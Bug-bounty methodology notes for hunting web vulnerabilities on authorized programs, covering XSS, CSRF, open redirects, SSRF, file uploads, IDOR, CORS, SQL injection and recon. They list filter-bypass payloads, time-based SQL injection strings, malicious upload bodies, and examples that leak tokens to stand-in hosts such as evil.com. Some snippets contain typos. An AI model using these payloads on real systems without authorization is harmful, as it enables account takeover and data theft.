## Don't over Complicate things

* logging in
* Commenting on a post

## Questioning

* [ ] **what did they consider when setting this up?**
* [ ] **Can i maybe find a vulnerability here?**
* [ ] **Can you comment with basic HTML such a `<h2>`**
* [ ] **where is it reflected on the page?**
* [ ] **Can i input XSS in my name**
* [ ] **Does it make any requests to an /api/endpoint**
* [ ] **Which may contain more interesting endpoints?**
* [ ] **Can i edit this post?**
* [ ] **Maybe there's IDOR?!**

## Developer experience

* [ ] **Understanding what a payload is trying to achieve?**
* [ ] **Why and how did a hacker come up with this payload?**
* [ ] **What does it do?**
* [ ] **why did they need to come up with this a payload?**
* [ ] **Combine this with playing with basic HTML**
* [ ] **What path/parameter does the code take (POST or GET,json post data etc)**
* [ ] **brute force some common parameters (can get lucky on guessing)**

## Common issues I start with & why

* **Stick to what you know best to create an impact with your feelings**
* **Common bugs for on bug bounty programs and spend much time learning how the web application works.**
* **Developers make the same mistakes over internet**
* **Look through the design of the application**
* **The trend they are following (open source flame works)**
* **Look for filters in place and aim to bypass these**

### 1. Cross Site Scripting (XSS)

{% hint style="success" %}
\#xss
{% endhint %}

* This is the most common vulnerabilities found on the bug bounty program
* Input your HTML into a parameter/field and the website reflect it as valid HTML
  * example: Search form -> Enter `<img src=x onerror=alert(0)>`
  * Upon Search it shows back a broken image along with an alert box.
* This means your inputted string was reflected as valid HTML and it is vulnerable to XSS
* Test every parameter to find out if its reflected
* as we test we can also look for Blind XSS and Reflective XSS
* The only hardship is to bypass the WAFs. there is no clear way to do it execpt try and error and also look for other researchers how they bypassed them
  * [**Awesome-WAF**](https://github.com/0xInfection/Awesome-WAF)
* Remember to create a lead.
* if we receive a filter, it comes that the parameter we are testing is vulnerable to XSS
* But the developer created a filter to prevent any malicious HTML
* This should also be one of the reason you spending looking for XSS
* if they are filtering certain payloads, it can give you a feel for the overall security of their site
* This is an easy bug to prevent, so its easy to create filter
* Think of SSRF filtering just internal IP addresses? perhaps they forgot about
  * http://169.254.169.254/latest/meta-data chances are they did.<br>

### Process for testing for XSS & Filtering

#### **Step one: Testing different encoding and checking for any weird behaviour**

> find out what payloads are allowed on the parameter how the website reflects/handle it

**Most basic `<h2>,<img>,<table>` without any flitering**

* [ ] is it reflected as HTML?
* [ ] are they filtering malicous HTML?
* [ ] if its reflected as `&it`or `%3c` ?

**Test the double encoding `%253C` and `%26it`**

* Some other interesting encodings to try out [**ghettoBypass**](https://d3adend.org/xss/ghettoBypass)
* This is test is to find out what's allowed and isn't and how they handle our payload
  * Example: if `<script>` was reflected as `&it;script&gt;` but `%26itscript%26gt`was reflected as `<script>`
  * Then i know am on to a bypass and i can begin to understand how they are handling encodings
  * Which can help in finding other bugs
  * If not matter what you always see `&it;script&gt;` or `%3script%3E` then the parameter may not be vulnerable<br>

#### **Step Two : Reverse engineering the developers' thoughts (this gets easier) with time experience.**

* Getting into the developers head as check what type of filters they've created.
* And start asking why?
* how does this website handle encodings? `<00iframe>`, `on%0derror`

- [ ] Does this filter exist elsewhere throughout the webapp?
- [ ] Example: Notice if they are filtering `<script>`,`<iframe>` aswell as `"onerror="` but notice they&#x20;
- [ ] aren't filtering `<script`then we know it's a game on and time to be creative.
- [ ] Are they only looking for complete valid HTML tags?
- [ ] if so we can bypass with `<scriptsrc=//mysite.com?c=`
- [ ] if we don't end the tag and its instead appended as a parameter value .
- [ ] is it just a blacklist of bad HTML tags?
- [ ] may the developer is not up to date and forgot things such as `<svg>`
-   [ ] if it is just a blacklist, then does this blacklist exist elsewhere?

    lets thinks about file uploads.

* Try many different combinations as possible with different encoding, format
* The more you poke the more you learn
* More payloads [**xsspayloads**](https://zseano.com/)

#### **Testing for XSS flow**

* how are "non-malicious" HTML tags such as `<h2>` handled?
* What about incomplete tags? `<iframe src=//hamcodes.com/c=`
* How do they handle encodings such as `<00h2`?
* There are LOTS to try here, `%0d`, `%0a`,`%09` etc
* is it just a blacklist or hardcoded strings?
* Does `</script/x>`work? `<ScRipt>`etc.
* \==Following this process will help you approach XSS from all angles and determine what filtering may be in place and you can usually get a clear indication if a parameter is vulnerable to XSS within a few minute==

[**Agreat resource**](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet)



### 2. Cross Site Request Forgery(CSRF)

{% hint style="danger" %}
\#csrf
{% endhint %}

**This involves forcing users to do a specific action on the target website from your website**

* Via HTML form `(<form action= "/login"method="POST"> )`
* Example: CSRF bug is forcing user to change their account email to one controlled by you.
* it can lead to account takeover
* Developers can protect CRSF easily but some opt to create custom code instead.<br>

**when hunting for this bug, Look at areas on website with protection around them**

* Such as updating your account information
* This can also give you a clear security on the system site **Question**
* What behaviour do you see when sending a blank CSRF value?
* Did it reveal any framework information from an error?
* Did it reflect your changes but with a CSRF error?
* Have you seen this parameter name used on other websites?
* Maybe there isn't even any protection?
* Test their most secure features(account functions usually as mentioned above)
  * Then work your way backwards<br>

**Some feature may have different CRSF protection as you continue to test the site.**

* Consider why is it ?
* Different team?
* Old codebase?
* perhaps a different parameter name is used
* Now you can hunt specifically for this parameter knowing its vulnerable.
* Developers only check the referrer header value, if its not their website then drop the request.
* This backfires by getting a blank referrer, if the checks only execute when the referrer header is actually found, and if it isn't no checks done .
  * `<meta name="referrer" content="no-referrer"/>`
  * `iframe src="data:text/html;baseˆ$,form_code_here">`



**Sometimes they only check their domain. if found in the referrer**

* Creating a directory on your site & visit https://www.yoursite.com/https://www.theirsite.com/
* This may bypass the checks.
* what about https://www.theirsite.computer/?
* My focus is finding areas with CSRF protection (sensitive area!)
* Check see if they created custom filtering.
  * Where there is a filter, there is usually a bypass
* There isn't a list of common areas when hunting for CSRF.
  * every website contains different features, but typically all sensitive features should be protected from CSRF.
  * so find the sensitive areas and test them.
* Example: if the website allows you to checkout,
  * can you force the user to checkout thus forcing their card to charged

### 3. Open url redirects

* Favourite bug to find because success rate is usually 100%
* This done by using harmless redirect in a chain
* if the target has some type of Oauth flow which handle a token along with a redirect.
* Open the URL redirects are simply urls such as.
  * https://www.google.com/redirect?goto=https://www.bing.com/
  * when visited it redirects to the URL provided in the parameter
  * Alot of developers fail to create any type of filtering/restriction on these
  * So they are very easy to find.

**Filter sometimes can exist to stop you**

below are some of the payload i use to bypass filters the can also be used to determine how their filter is working.

* `\/yoururl.com`
* \`//yoururl.com
* `\\yoururl.com`
* `//yoururl.com`
* `//theirsite@yoursite.com`
* \`//yoursite.com
* `https://yoursite.com%3F.theirsite.com/`
* `https//yoursite.com%2523.theirsite.com/`
* \`https://yoursite?c=.theirsite.com(use # \ also)
* `//%2F/yoursite.com`
* `////yoursite.com`
* `https://theirsite.computer/`
* `https://theirsite.com.mysite.com`
* \`/%0D/yoursite.com (Also try %09, %00, %0a, %07)
* `/%2F/yoururl.com`
* `/%5Cyoururl.com`
* `//google%E3%80%82com`

**Some common words i dork for on google to find end points:(Test upper & lower case too)**

* `return`
* `return_url`
* `rUrl`
* `cancelUrl`
* `url`
* `redirect`
* `follow`
* `goto`
* `returnTo`
* `returnUrl`
* `r_Url`
* `history`
* `goback`
* `redirectTo`
* `redirectUrl`
* `redirUrl`
* let's take advantage of our findings
  * more about how Oauth login works #Auth
  * [**Ouath**](https://www.digitalocean.com/community/tutorials/an-introduction-to-oauth-2.)<br>

**The login page look like this:**

* https://www.target.com/login?client\_id=123\&redirect\_url=/sosecure
* the redirected _url_ will be whitelisted to only allow for `*.target.com/*`
* Spot the mistake?
* Armed with an open url redirect on their website, you can leak the token
* As the redirect occurs the token is smuggled with request.
* The user is sent to
  * https://www.target.com/login?client\_id=123\&redirect\_url=https://www.target.com/redirect?redirect=1\&url=https://www.hamcodes.com/
* to the attackers website along with their token used for Authentication
* Account takeover report incoming!
* One common problem people run into is not encoding the values correctly
* Especially if the target only allows for /localRedirects



**My payload will look like**

* `/redirect?goto=https://hamcodes.com/`<br>
* Using `?goto=parameter` may get dropped in redirects(depending on how the web application works and how many redirects occurs)<br>
* This can be case if it contain multiple parameters (via &)
* And the redirect parameter maybe missed
* I'll also encode certain values such as & ? # / \ to force the browser to decode it after the first redirect
  * `Location: /redirect%3Fgoto=https://www.hamcodes.com/%253Fexample=hax`<br>
* which then redirects the browser and then kindly decode %3F in the BROWSER URL to?,
* the parameter were successfully sent through
  * `https://www.example.com/redirect?goto=https://www.hamcodes.com/%3Fexample=hax,`<br>
* which then when it redirects again will allow the ?example parameter to also be sent.
* sometimes I'll double encode them based on how many redirects are made & parameters.
  * `https://example.com/login?return=https://example.com/?redirect=1%26returnurl=http s%3A%2F%2Fwww.google.com%2F`<br>
  * `https://example.com/login?return=https%3A%2F%2Fexample.com%2F%3Fredirect=1%2526returnurl%3Dhttps%253A%252F%252Fwww.google.com%252F`<br>
* When hunting for url redirects they can also be used in SSRF
* If the redirect you discover is via the “==Location==:” header then XSS will not be possible
* if it redirected via something like “==window.location==” then you should test for “==javascript==:” instead of redirecting to your website as XSS will be possible here.

**Some common ways to bypass filters**:

* java%0d%0ascript%0d%0a:alert(0)
* j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0` java%07script:prompt`0`
* java%09scrip%07t:prompt`0`
* jjavascriptajavascriptvjavascriptajavascriptsjavascriptcjavascriptrjavascriptijavascript
* pjavascriptt:confirm`0`

## Server Side Request Forgery (SSRF)

{% hint style="danger" %}
\#SSRF
{% endhint %}

* This is the in-scope domain issuing a request to an URL/endpoint you've defined.
* Sometimes it doesn't always signal the target is vulnerable.
* when hunting for SSRF i look for features which already take an \_URL parameter<br>
  * Why?
  * because i look for specific areas on website where the developer may have created filters to prevent malicious activity.
    * Example : I'll try finding their _API Console_ (i check on their developer docs page if available)
      * These areas usually contains features which take \_URL parameter and execute<br>

**Think about&#x20;**_**webhooks**_**&#x20;and hunt for features which handle&#x20;**_**URLs**_

* I keep an eye out for _common parameter names_ used for handling URLs
  * An example is here from hackeron**e**[**Right $ clear**](https://hackerone.com/reports/446593)<br>

**when Testing SSRF i always test how they handle redirects**

* You can host a redirect locally via using XAMPP & NGrok.<br>
* XAMPP allows you to run PHP code locally and ngrok gives you a public internet address
  * _Don't forget to turn it off when finishe testing_<br>
* for Tutorials to set XAMPP up [refer](https://www.bugbountyhunter.com/) Setup a simple redirect script and see if the target parses the redirect and follows<br>

**What happen if you add sleep(1000) before the redirects?**

* Can you cause the server to hang and timeout?
* Maybe their filter is only checking the parameter value!
* Does it check the redirect value and successfully allows you to read internal data?
* Try a potential open redirect you have discovered as part of you chain
* if they are filtering external websites.
* Hunt for third party software they may be using such as jira.
* Stay up to date with the lastest CVE's.
* software like this usually contains interesting server related features

## File uploads for stored XSS & remote code execution

{% hint style="danger" %}
\#xss
{% endhint %}

**Developers create filter as to what files to allow and what to block.**

* if files are stored on their domain then the first thing to check uploading is:
  * `.txt`
  * `.svg`
  * `.xml`

**These three file sometimes are forgotten and slip the filter.**

* fast test with _.txt_ see how strict the filter is
* if it says only images _.jpg,.png,.gif_ are allowed for example
* This can give you an indication that all photos are stored in the same format regardless of type of photo we upload.
* Are they not trusting any of out input if we save it as `.jpg` regardless



**The approach of testing file upload filenames is similar to XSS with testing various characters and encoding.**

* example: what happen if you name the file .`hamcodes.php/.jpg`
* the code may see it as `.jpg` but the server writes it as `hamcodes.php` and miss everything after the forward slash.
* I've also had success with the payload `hamcodes.html%0d%0a.jpg`.
* the server will see it as `.jpg` but because `%0d%0a` are newline characters
* it will be saved as `hamcodes.html`
* Some filenames are reflected on the page and you can smuggle XSS character in the filename
* Some developers think users can save file with `<> "characters in them`.

```shellscript
------WebKitFormBoundarySrtFN30pCNmqmNz2
Content-Disposition: form-data; name="file"; filename="58832_300x300.jpg<svg onload=confirm()>"
Content-Type: image/jpeg
ÿØÿà 
```

### **Questions**

* [ ] what is the developer checking for exactly?
* [ ] How are they handling it ?
* [ ] Are they trusting any of our input?
* [ ] if i provide it with this , how will it handle it

```shellscript

------WebKitFormBoundaryAxbOlwnrQnLjU1j9
Content-Disposition: form-data; name="imageupload"; filename="hamcodes.jpg" 
Content-Type: text/html
```

* [ ] Does the code see the `.jpg` and think image extension.
* [ ] Does it trust the content type and reflect it as Content-Type:text/html?
* [ ] Does it set content type based on the extension?
* [ ] what happens if you provide it with NO file extension?(or file name!)
* [ ] will it default to the content-type or file extension?

```shellscript
------WebKitFormBoundaryAxbOlwnrQnLjU1j9
Content-Disposition: form-data; name="imageupload"; filename="hamcodes." 
Content-Type: text/html

------WebKitFormBoundaryAxbOlwnrQnLjU1j9
Content-Disposition: form-data; name="imageupload"; filename=".html" 
Content-Type: image/png
<html>HTML code!</html>
```

-it is all about providing it with malformed input & seeing how much of that they trust. -they may not be doing checks on the file extension. -They are instead doing checks on the image size. -sometimes if you leave the image header this enough to bypass the checks.

```shellscript
------WebKitFormBoundaryoMZOWnpiPkiDc0yV
Content-Disposition: form-data; name="oauth_application[logo_image_file]"; filename="testing1.html"
Content-Type: text/html
‰PNG 
<script>alert(0)</script>
```

spending enough time testing the filter in file upload is worthy

## insecure Direct Object Reference (IDOR)

* An example of an IDOR bug is simply a url such as `http://api.hamcodes.com/user/1`
* which when queried will give you the information to the user id "1".
* Changing it to user id "2" should give you an error and refuse to show you the user's details,
* However if they are venerable, then it will allow you to view that users' details
* IDOR is about changing integer values(numbers) to another and seeing what happens.
* That the explain like i'm 5".
* its not as simple as looking for just (1) values.
* Sometimes you will see a GUID `(2b7498e3-9634-4667-b9ce-a8e81428641e)`
* Or another type of encrypted value.
* Brute forcing GUIDs is usually a dead end



**At this stage i check for any leaks of this value.**

* example:`https://www.example.com/images/users/2b7498e3-9634-4667-b9ce-a8e81428641e/ photo.png`
*   ex.2 : creating an online Appointment Form



## **Questions**

* As the value leaked anywhere on the site?
* perhaps its been indexed by Google?
* I start to look for more keywords such as "appointment", "appointmentID"
* Test to see if the ID is generated with the same characters or length.
* Check with an integer value, the server may process it it the same way
* mobile app would be my first target on a program if am hunting for IDOR.
* when querying for profile information it will likey make a request to their API with just user ID to identify who you are.<br>

**Example:** a website which allows to upload private photos but you've discovered an IDOR which allows you to view any photo you wish.

* _Think deeper_

- [ ] what else have they forgotten to do certain permission checks on?
- [ ] Can you sign up as various different roles (admin, guest),
- [ ] Can you perform admin actions as a guest?
- [ ] can non paying members access paid features?
- [ ] Hunting for integer values i try to inject ID parameters.
- [ ] if the request and the post data is JSON `{"example":"example"}.`
- [ ] Try simply injecting a new parameter name `{"example":"example","id":"id"}`
- [ ] Json is parsed server-side and for all other requests look for ==PUT request==

## CORS (Cross-Origin Resource Sharing )

{% hint style="danger" %}
\#cors
{% endhint %}

* This is another common area to check filters to bypass.
* Look for headers with
  * `Acesss-Control-Allow-Origin`
  * `Access-Allow-Credentials:true`



**These headers allow an external website to read the contents of the website.**

* Example :
  * if you have the sensitive information on https://api.hamcodes/user/ and you saw `Acesss-Control-Allow-Origin`: https://www.yoursite.com/.
  * Then you could the content of this website successfully via yoursite.com.
  * `Access-Allow-Credentials:true` will be needed if season cookies are required on the request.
  * Developer will only create filters to only allow for their domain to read the contents but remember.
  * when there is a filter there is usually a bypass
  * CORS misconfiguration simply add `Origin:theirdomain.com` on to every request you make
  * Then grep for `Acesss-Control-Allow-Origin`
  * other approach `anythingheretheirdomain.com`

## SQL Injection

{% hint style="danger" %}
\#SQL
{% endhint %}

**legacy code is more vulnerable to SQL injection.**

* keep an eye for old features.
* Take all places which query the database for inputs
* These days most of the developers disable error messages so its not the if you don't the error thats where it stops
* Try checking with a sleep payload.(usually they'll slip through any filter )
* It's easy to indicate the delay on the response which would mean your payload was executed blindly<br>

**I'll use between 15-30 seconds to determine if the page is actually vulnerable**

* `or sleep(15)and 1=1#`
* `or sleep(15)#`
* `union select sleep(15),null#`



when texting for SQL injection I will take the same approach as XSS and test throughout the web application. \_though they are rare to find these days \_

## Business/Application Logic

This involves understanding how the website work and create weird behaviour which can lead to interesting findings.

**Example** : if you test a target with max limit of $1,000. if you change that to $10000 and bypass their limit then you've done nothing but take advantage of the feature

**Common areas to look for this bug is new feature which interact with old features**

_**`E`xample**_**:** Getting premium access but they require a valid payment data.you need to upgrade to access the page So the valid payment data act as identification.

* If we bypass it then will own the page
* Spending days/weeks understanding how the developer expected the user to input/do



**Then come up with ways to break & bypass this.**

* _example_: Signup for a account with the email example example@target.com.
* sometimes these accounts have special privileges such as no rate limiting and bypassing certain verfications.<br>

**You get to find mure of these bugs if you have an understanding how the website works.**

* understanding how things SHOULD work
* imagine different endpoints available to some users and how they can access them.
* Looking out for APIs
* This bug doesn't need any use of payload just understanding _the flows of the web application and circumventing these_

## Choosing a program

**Seven step methodology:**

1. Spending months on their program(You can't find bugs in weeks some companies are huge)
2. Choose a wide scope and well know names (easy to find mistakes in big company)
3. Focus on you to pick the platform
4. The main methodology is using features available to me on their website and find issues.
5. Then expand my attack surface as i scan for subdomains, file and directories
6. Spending more time getting into developers' head
7. Complete mind-map of this company and how everything works. Don't rush the process, trust it.

## checklist for a good well run bug bounty program.

* [ ] Direct Communication of rely on the platform 100% (managed service then proceed with caution.)
* [ ] Does the program look active ? when was the scope last updated
* [ ] How does the team handle low hanging fruit bugs which are chained to create more impact?
* [ ] Does the team reward each XSS as the same or do they recognise your work and reward more.
* [ ] Don't be afraid to walk away from bad experiences.
* [ ] Response time across 3-5 reports. not more than month.

## Writing notes as you hack

This save you from burnout in the feature and it streamlines the process

* You can always refer back to you notes and revisits interesting endpoints
* Trying new feature with anew approach with a fresh mindset.

**1.Note down**

* interesting endpoints
* Behaviour and parameters(as you are browsing and hacking the web application)
* features which can/ can't be exploited
* what you have tried what you believe is vulnerable
* Never burn yourself out
* If your guts is saying you are tired of testing then move on.<br>

**2.Note can help you to create custom wordlists.**

* Example: You are testing example.com and we've discovered `/admin /admin-new /server_health`
* parameters `debug and isTrue`

we can create example.com-endpoints.txt & params.txt, we know these endpoints work on the specific domain

* from there you can test all the endpoints /parameters across multiple domains
* create a global-endpoints.txt and begin create commonly found endpoints.
* Overtime you will end up with lots of endpoints/parameters for specific domains
* you can start to map out a web application much easier.

## <mark style="color:purple;">Let's apply my methodology & hack!</mark>

### step one: Getting a feel for things

* First Question: Has anyone else found anything and disclosed a writeup?
* Google, HackerOne disclosed and OpenBugBounty for any issues in the past
* Any interesting bypass used by other Hackers https://www.google.com/?q=domain.com+vulnerability https://www.hackerone.com/hacktivity https://www.openbugbounty.org/
* How the main website works
* Testing the login or register feature

- [ ] Can i login with my social media account?
- [ ] Is it the same on the mobile application?
- [ ] if i try another geolocation can i login with more options?
- [ ] What characters aren't allowed.
- [ ] let my thought go down a rabbit hole because thats what make me a natural hacker
- [ ] what inputs can you control when you sign up?
- [ ] What are these reflected?
- [ ] Does the mobile signup use a different codebase?<br>

* \*\*\*Below is a list of key features i go for on my first initial look
* \*\*\*Question i ask myself when looking for vulnerabilities

#### Registration Process

* what's required to sign up?
* if there's a lot of information (Name, location, bio, etc)
* where is this then reflected after signup?

#### **\*\*\*upload a photo**

* [ ] check what type of file we can upload?
* [ ] Can we upload a normal jpeg but change the extension to `.txt .xml and .svg`
* [ ] This depends on the web application works, you may not see where your photo is uploaded until after you complete the registration process.
* [ ] re-testing features multiple times works well here. \*\*\*Display name and profile description
* [ ] where are they reflected/stored until you complete the signup process.
* [ ] What characters are allowed?
* [ ] where is this information used?
* [ ] Try sign up with <> see if it's displayed after registration.
* [ ] Did the developer only prevent XSS on your profile? about making a post or adding someone?

#### \*\*\*Can i register with my social media account?

* [ ] if yes , Is there any type of Oauth flow implementation?which i may be able to leak?
* [ ] what social media account are allowed?
* [ ] what information do they trust from my social media profile?
* [ ] Try discovering stored XSS via importing my facebook album conveniently named \`"alert(0)".<br>

#### **\*\*\*what characters are allowed? Is <>" ' allowed in my name" ?**

* [ ] Enter the XSS process testing. `<script> Test my not work but <script does)`
* [ ] what about unicode , `%00, %0d` ?
* [ ] how will it react to me providing `myemail%00@email.com`?
* [ ] it may read it as `mymail@email.com`?
* [ ] is it the same when signing up with their mobile app?<br>

#### _**Can i sign up using @target.com or is it blacklisted?**_

* [ ] if yes to being blacklisted why?
* [ ] Perhaps it has special privileges/features after signing up?
* [ ] Can you bypass this ? Always sign up using your target email address.\
  <br>

#### \*\*\*What happens if i revisit the register page after signing up?

* [ ] Does it redirect, and can i control this with a parameter?(Most likely yes!)
* [ ] what happens if i re-sign up as an authenticated user?
* [ ] Think about it from developers' perspective.
* [ ] They want users to have a good experience so revisiting the register page when authenticated should redirect you.
* [ ] Enter the need for parameters to control where to redirect the user!<br>

#### _**what parameter are used on this endpoint?**_

* [ ] Any listed in the source or javascript?
* [ ] Is it the same for every language type as well device (Desktop vs mobile)
* [ ] if applicable, what do the .js files do on this page?
* [ ] the login page has specific "login.js" file which contains more URLs
* [ ] This may give an indication that the site relies on a .js file for each feature!
* [ ] here is video about hunting for js file . [Let’s be a dork and read .js files](https://www.youtube.com/watch?v=0jM8dDVifaI)<br>

#### \*\*\*what does Google know about the register page?

* Login/register pages change often (user experience again) and Google robots indexes and remembers a LOT.
  * `site:example.com inurl:register inurl:&`
  * `site:example.com inurl:signup inurl:&`
  * \`site:example.com inurl:join inurl:&.

#### Login Process (and reset password)

\*\*\*is there a redirect parameter used on the login page?

* Typically the answer will be yes.
* As they want to control where to redirect the user after logging in.
* User experience is the key for developers
* Even if you don't see one being used try the most common ones:
  * `returnUrl`
  * `goto`
  * `return_url`
  * `returnUri`
  * `cancelUrl`
  * `back`
  * `returnTo`

_**what happens if i try login with myemail%00@email.com?**_

* Does it recognise it as myemail@email.com and maybe log me in?
* if yes yes signup with my%00email@email.com and try for an account takeover.
* think about the same when claiming a username too

\*\*\*Can i login with my social media account? if yes

* is there any Oauth implementation which require tokens which i may be able to leak?
* what social media is allowed ? is it the same for all countries?
* You may think this is related to the registration process however not always.
* sometime you can only login via social media but can't register and you connect it once logged in
* which would be another process to test in itself?

\*\*\*How does the mobile login flow differ from desktop?

* Remember, user experience! Mobile website are designed for user to have easiest flow as they don't have a mouse to easily navigate.

\*\*\*when resetting your password what parameters are used?

* perhaps it will be vulnerable to IDOR (try injecting an id parameter and testing for HPP!).
* is the host header trusted?
* Imagine resetting the password you set the host to: `Host:evil.com`, will it then trust this value & send it in the email? leading to reset password token leak when the user clicks on the link(leading to evil.com/resetpassword?token=123)
* Typically you can test the login/register/reset password for rate limiting (brute force attack) but often this is considered informative/out of scope?
* check the program policy & check their stance on this
* Most websites implement strong password polices and 2FA.

#### Updating account information

\*\*\*Is there any CSRF protection when updating your profile information?

* There should be , so expect it. Remember,
* we're expecting this site to be secure and we want to challenge ourselves on bypassing their protection.
* if yes how is this validated?
* what happens when i send a blank CSRF token? or a different token with the same length?

\*\*\*Any second confirmation for changing your email/password?

* if no, you can chain this with XSS for account takeover.
* Typically by itself it isn't an issue,
* if the program wants to see impact from XSS then this is something to consider?

\*\*\*How do they handle basic <>" ' characters and where are they reflected?

* what about unicode? `%09 %07 %0d%0a` These characters should be tested everywhere possible.
* leave no stone untuned.

\*\*\*can i input my own URL on my profile?

* what filtering is in place to prevent something such as javascript:alert(0)?
* its a key area to look for when setting up my profile.

\*\*\*is updating my account information different on the mobile app?

* most mobile apps will use an API to update information (check IDOR)
* check if desktop filtering is the same as the one on mobile. (XSS)

\*\*\*How do they handle photo/video uploads (if a vailable)?

* what sort of filtering is in place?
* Can i upload `.txt` even though it say `.jpg .png` is allowed?
* Do they store these files on root domain or is it hosted elsewhere?
* check if the domain where its stored is included in the CSP

\*\*\*what information is actually available on my public profile that i can control?

* The key is what you can control how and where its reflected.
* what's in place to prevent me from entering malicious HTML in my bio ?
* Maybe they used htmlentities so <> "is filtered, and it's reflected as:
  * \`
* if you could use `');alert('example');` which result in:
  * `<div id="example" onclick="runjs('userinput');alert('example');">`

#### Developer tools

Theses include something such as :

* Testing webhooks
* oauth flows
* graphql explorers These are tool set up to help developers to explore and test various API's publicly

\*\*\*where are they?

* Do they host it themselves or is it hosted on AWS?
* Usually it is. if it is hosted on AWS then your aim will be to read AWS keys.

\*\*\*what tools are available for developers?

* can i test a webhook event for example?
* just google for SSRF webhook and you'll see

\*\*\*Can i actually see the response on any tools ?

* if yes, focus on this as with the response we prove impact easier if we find a bug.

\*\*\*Can i create my own application ?

* how about the permission (token)

\*\*\*After creating an application, how does the login flow actually work?And when i "disconnect"the application from my profile.is the token invalidated?

* Are there anew _return\_uri_ parameters used and how do they work?
* You can discover the company's whitelist certain domains for debugging/testing.
* Try -_theirdomain.com, .aws.amazon.com. http://localhost_
* its common but it doesn't affect users.

\*\*\*Does the wiki/help docs reveal any information on how the API works?

* the wiki provide information on how the token was authenticated
* API docs also reveal more API endpoints , plus keywords for your wordlist. you are building for you target

\*\*\*Can i upload any files such as an application image?

* is the filtering the same as updating my account information?
* is it using another/different codebase?
* finding example.com not vulnerable to picture upload doesn't mean different code is used when uploading a profile photo on developer.example.com

\*\*\*Can i create a separate account on the developer site or does it share the same session from the main domain?

* what's the login process like if so?
* sometime you can login to the developer site (developer.example.com) via your main session(www.example.com)
* There could be token exchange handled by a redirect.
* Try entering the open url you have discovered by now.
* if the account is brand new re-enter that open url redirect
* see what is reflected and where

#### The main feature of the site.

* This depends on the website you are testing
  * example website which handle file upload
* take your time testing each feature,Try getting a mind map on how the website is put together.
* Notice all requests use GraphQL, or discover the same parameters used throughout, "xyz\_id =11 "
* same code? One bug equals many.

\*\*\*Are all of the features on the main web application also available on the mobile app?

* Do they work differently at all?
* Sometimes some feature on mobile app aren't available on the Desktop.
* Test different country tides as they may offer different features if its in scope.
* check payment checkout if they are the same for other countries

\*\*\*What features are actually available to me?

* what do they do and what type of data is handled?
* Do multiple features all use the same data source?
* Is the request the same for each feature to retrieve information(API)? example:final checkout page with a product page to estimate shipping.
* is it different parameters/endpoints throughout.

\*\*\*Can i pay for any upgraded features?

* if yes test with paid vs free account.
* Can the free account access the paid features without paying?

\*\*\*what are the oldest features?

* research for the features they were excited to release but didn't workout.
* Google dorking around can help you find old files
* old code = bugs.

\*\*\*what new features do they plan on releasing?

* can i find any reference to it already on their site?
* follow on the social media signup to their newsletters.
* stay update on what the company is working on and stay up to date.
* Think about change `true to false`and the vice verser check out this article on this. https://www.jonbottarini.com/2019/06/17/using-burp-suite-match-and-replace-settings-to-escalate-your-user-privileges-and-find-hidden-features/

\*\*\*Do any feature offer a privacy setting? (private & public)?

* Testing features see if they are intended to work.
* Is that post really private?
* focus on what is in front of you

\*\*\*if any features have different account level permission?

* (admin,moderator,user,guest)
* Test the various level of permissions?
* Can the guest make API calls only a moderator should be able to?

#### Payment features

\*\*\*what features are available if i upgrade my account?

* can i access them without paying? How? (business impact loss of revenue bag) not paid.

\*\*\*Is it easily obtainable

* From an XSS because it's in the HTML DOM?
* Chain XSS to leak payment information for higher impact

\*\*\*what payment option are available for different counties?

* see if they require phone verification to claim ownership of the page.
* you can find test numbers from sites below.
  * https://www.jonbottarini.com/2019/06/17/using-burp-suite-match-and-replace-settings-to-escalate-your-user-privileges-and-find-hidden-features/
  * https://www.paypalobjects.com/en\_GB/vhelp/paypalmanager\_help/credit\_card\_numbers.htm

**Next is to expand our attack surface and dig deeper.**

### Step Two : Expanding our attack surface.

Start by running the subdomain scanning tools.

* start looking at domains with function features Start google dorking some common keywords. This is hunting for domains with functionality. `login,register,upload,contact,feedback,join,signup,profile,user,comment,api,developer,affiliate,careers,upload,mobile,upgrade,passwordreset`

check out this post:https://exposingtheinvisible.org/guides/google-dorking/

\*\*\*Google is great TOOL to spider the world.

* As long as you ask the right questions?
* Don't overlook on duplicating results from google.
* if you scroll to the last page of your search & click repeat the search with omitted results included.
* Then more result will appear
* As you are dorking you can use keywords to remove some certain endpoints you're not interested in
* check also the mobile user-agent with the Desktop as the results are different

\*\*\*Dorking for file extensions.

* `php, aspx, jsp, txt, xml, bak.`
* Revealing the file extension can give you an insight in the web technology used on the domain and server
* can also help you to know which wordlist you are going to use when fuzzing
* can even get lucky and find sensitive file exposed
* Don't not blindly use wordlist on your target use meaningful wordlist to yield better results.

\*\*\*Dorking on GitHub, Shodan , BinaryEdge.

* search for strings search as "domain.com" api\_secret, api\_key, apiSecret, password, admin\_password

\*\*\*XAMPP

* To quickly scan the robots.txt of each domain
* Why robots.txt? because Robots.txt contains a list of endpoints the website own does & does NOT want indexed by google so for example
* it may reveal the third party software used and guess what id on the subdomain
* Robot.txt is a great starting indicator to determine whether a subdomain is worth scanning for further directories/files.
* Find subdomain which have function to play with rather than relying on the wordlist

\*\*\*Burp intruder to scan for robots.txt.  \*\*\*Run XAMPP locally, host a basic PHP script:

* `<?php header("Location:".$_GET['url']; ?)>`
* we are looking for keywords such as "dev", "prod", "qa"?
* Are there third party controlled domain such as careers.target.com?

\*\*\*WayBackMachine.org

* this enables you to see a site history for years ago and sometimes old files referenced in robots.txt

\*\*\*Scanning with FFUF, CommonSpeak

* looking for sensitive files & directories

Don't forget to test for GET.POST! i have had cases where it wasn't vulnerable in a GET request but it was in a POST.$\_GET vs $\_POST

**Note:**\[Going through everything again is important. The more you look the more you learn, you cant find everything on the first look]

* checking for .JS file on each endpoint. looking at developers notes as well as more interesting endpoints
